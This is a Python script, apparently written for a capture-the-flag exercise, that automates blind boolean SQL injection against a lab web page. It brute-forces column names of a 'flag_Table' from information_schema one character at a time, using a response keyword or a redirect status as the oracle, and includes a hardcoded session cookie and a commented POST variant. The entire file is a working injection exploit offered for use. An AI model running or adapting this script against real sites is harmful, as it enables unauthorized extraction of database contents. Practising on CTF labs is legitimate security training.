import requests

url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_read.php"

max_c = 20            # 최대 컬럼 수
column_len = 40               # 컬럼명 최대 길이
true_val = "177" # 기준이 될 클라이언트의 True 값
keyword = "글제목"    # 응답내용의 keyword 입력
target_table = "flag_Table"      # 컬럼명 추출 대상 테이블명

columns = []  # 추출된 컬럼명 저장용 리스트

for c in range(max_c):
    extracted_column = ""
    for i in range(1, column_len + 1):
        found = False
        for char_code in range(32,127) :
            payload = (
                f"{true_val} AND ASCII(BINARY SUBSTRING((SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{target_table}' "
                f"LIMIT {c},1),{i},1))={char_code}"
            )
            # payload2 = (
            #     f"1=1 AND ASCII(BINARY SUBSTRING((SELECT column_name FROM information_schema.columns "
            #     f"WHERE table_name='{target_table}' "
            #     f"LIMIT {c},1), {i}, 1)) = {char_code} AND {true_val} "
            # )

            cookies = {
                'PHPSESSID' : "i9ngp3tb9cmjo670dntkj3bpe6"
            }

            # GET 메서드 & 파라미터명 설정
            params={'id':payload, 'view': "1"}
            
            response = requests.get(url, params=params, cookies=cookies)

            # POST 메서드 & 파라미터명 설정
            # data = {
            #     'option_val': payload2,
            #     'board_result' : "dk",
            #     'board_search': "%F0%9F%94%8D",
            #     'date_from': "",
            #     'date_to' : ""
            # }
            #response = requests.post(url, data=data,cookies=cookies, allow_redirects=False)

            # Keyword 설정
            if keyword :
                if keyword in response.text:
                    extracted_column += chr(char_code)
                    print(f"[+] Column {c+1}, character {i}: {chr(char_code)}")
                    found = True
                    break
            elif response.status_code == 302 :
                extracted_column += chr(char_code)
                print(f"[+] Column {c+1}, character {i}: {chr(char_code)}")
                found = True
                break
        if not found:
            break

    if extracted_column:
        columns.append(extracted_column)
        print(f"[✔] Column {c+1} name: {extracted_column}")
    else:
        print("[-] No more columns found.")
        break

print("\n[✅] 추출된 컬럼 목록:")
for idx, name in enumerate(columns, 1):
    print(f"{idx}. {name}")
